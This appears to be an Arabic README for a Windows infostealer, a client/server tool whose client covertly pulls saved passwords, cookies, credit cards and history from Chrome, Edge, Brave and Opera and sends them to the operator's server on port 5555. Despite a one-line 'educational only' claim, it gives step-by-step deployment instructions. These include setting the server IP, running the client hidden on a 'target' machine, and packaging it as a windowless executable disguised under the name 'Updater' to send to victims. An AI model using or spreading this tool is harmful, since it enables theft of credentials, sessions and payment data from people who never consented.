# أداة استخراج بيانات المتصفح (Client/Server)

مرحبًا بك في أداة استخراج بيانات المتصفح. هذا المشروع عبارة عن نظام متكامل (عميل/خادم) مصمم لجمع بيانات تصفح الويب من أجهزة الكمبيوتر التي تعمل بنظام Windows وإرسالها إلى خادم مركزي.

**الغرض من هذه الأداة هو تعليمي وبحثي في مجال أمن المعلومات فقط.**

---

## محتويات المجلد

| الملف | الوصف |
| :--- | :--- |
| `server.py` | **الخادم (المستقبِل)** - البرنامج الذي تشغله على جهازك لاستقبال البيانات. |
| `client.py` | **العميل (الهدف)** - البرنامج الذي يعمل على الجهاز الآخر لجمع البيانات وإرسالها. |

---

## الميزات

- **بنية العميل والخادم**: يقوم العميل بجمع البيانات وإرسالها إلى خادم مركزي.
- **دعم متصفحات متعددة**: يدعم المتصفحات الأكثر شيوعًا (Google Chrome, Microsoft Edge, Brave, Opera).
- **استخراج بيانات حساسة**:
  - بيانات تسجيل الدخول (أسماء المستخدمين وكلمات المرور).
  - الكوكيز (Cookies).
  - بطاقات الائتمان المحفوظة.
  - سجل التصفح (History).
- **يعمل في الخفاء**: لا تظهر أي نوافذ عند تشغيل العميل على الجهاز الهدف.
- **حفظ منظم للبيانات**: يقوم الخادم بحفظ البيانات المستلمة في ملفات نصية منظمة.

---

## المتطلبات

### على جهاز الخادم (جهازك):

- Python 3.x

### على جهاز العميل (الجهاز الهدف):

- Python 3.x
- مكتبات إضافية. يمكنك تثبيتها باستخدام الأمر التالي:

```bash
pip install pywin32 pycryptodome
```

## دليل الاستخدام السريع

### الخطوة 1: تشغيل الخادم (`server.py`)

1. على جهازك (الخادم)، افتح الطرفية (Command Prompt) في هذا المجلد.
2. قم بتشغيل الأمر:

```bash
python server.py
```

3. سيبدأ الخادم الآن بالاستماع للاتصالات القادمة على المنفذ `5555`. تأكد من أن جدار الحماية يسمح بالاتصال على هذا المنفذ.

### الخطوة 2: تعديل وتشغيل العميل (`client.py`) على الجهاز الهدف

1. افتح ملف `client.py` باستخدام محرر نصوص.
2. ابحث عن متغير `SERVER_IP` وقم بتعديله إلى عنوان IP الخاص بجهاز الخادم.

```python
# client.py
def main():
    # تغيير هذا العنوان إلى IP الخادم الخاص بك
    SERVER_IP = "YOUR_SERVER_IP"  # <--- قم بالتعديل هنا
```

3. انقل ملف `client.py` (بعد تعديله) إلى الجهاز الهدف.
4. على الجهاز الهدف، قم بتشغيل السكربت.

### الخطوة 3: استقبال البيانات

1. عندما يتم تشغيل العميل، سيقوم بجمع كل البيانات المتاحة وإرسالها إلى الخادم.
2. على جهاز الخادم، ستجد مجلدًا جديدًا باسم `collected_data`.
3. داخل هذا المجلد، ستجد ملفات نصية تحتوي على البيانات المستلمة، مسماة بعنوان IP الخاص بالعميل وتوقيت الإرسال.

## قسم المطورين: كيفية تحويل العميل إلى ملف تنفيذي (.exe)

لجعل تشغيل العميل أسهل على الجهاز الهدف دون الحاجة لتثبيت Python، يمكنك تحويل `client.py` إلى ملف تنفيذي (.exe).

### 1. تثبيت متطلبات البناء

على جهاز التطوير الخاص بك، ستحتاج إلى تثبيت `pyinstaller`:

```bash
pip install pyinstaller
```

### 2. بناء الملف التنفيذي (.exe)

1. تأكد من أنك قمت بتعديل `SERVER_IP` داخل `client.py`.
2. افتح الطرفية (Command Prompt) في المجلد الذي يحتوي على `client.py`.
3. نفذ الأمر التالي لبناء الملف التنفيذي:

```bash
pyinstaller --onefile --noconsole --name "Updater" client.py
```

- `--onefile`: لإنشاء ملف تنفيذي واحد.
- `--noconsole`: (مهم جدًا) لإخفاء النافذة السوداء عند تشغيل الملف.
- `--name "Updater"`: لتحديد اسم الملف التنفيذي الناتج (يمكنك اختيار أي اسم).

4. بعد انتهاء العملية، ستجد الملف التنفيذي الجديد (`Updater.exe`) داخل مجلد جديد باسم `dist`. هذا هو الملف الذي ترسله إلى الجهاز الهدف.
